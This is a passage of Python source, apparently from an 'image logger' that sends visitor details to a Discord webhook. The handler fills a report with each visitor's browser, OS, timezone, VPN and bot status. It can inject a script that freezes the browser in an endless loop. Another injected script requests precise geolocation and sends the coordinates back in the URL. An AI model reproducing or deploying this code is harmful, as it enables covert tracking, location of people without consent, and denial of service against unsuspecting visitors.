                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
